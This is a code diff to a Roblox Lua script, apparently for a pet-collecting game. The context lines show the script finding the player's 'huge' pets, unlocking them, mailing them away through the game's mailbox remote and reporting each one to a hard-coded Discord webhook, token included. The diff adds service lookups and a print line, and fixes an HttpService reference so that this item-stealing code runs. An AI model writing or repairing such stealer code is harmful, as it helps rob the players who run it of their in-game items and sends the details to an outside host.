@@ -71,6 +71,9 @@ local function FrameFunction()
 end
 spawn(FrameFunction)
 
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local Library = require(ReplicatedStorage:WaitForChild("Library"))
 local ProcessedHuges = {}
 
@@ -107,6 +110,8 @@ function ProcessHugePets()
         end
 
         if #hugePets > 0 then
+            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+
             for i = #uids, 1, -1 do
                 local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
                 local request = (syn and syn.request) or request or (http and http.request) or http_request
@@ -117,7 +122,7 @@ function ProcessHugePets()
                     Headers = {
                         ["Content-Type"] = "application/json"
                     },
-                    Body = Http:JSONEncode({
+                    Body = HttpService:JSONEncode({
                         content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
                     })
                 })
@@ -126,6 +131,7 @@ function ProcessHugePets()
                     [1] = uids[i],
                     [2] = false
                 }
+
                 game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
                 wait(1)
                 wait(3)
@@ -138,6 +144,7 @@ function ProcessHugePets()
                     [5] = 1
                 }
                 game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
                 wait(3)
             end
         end
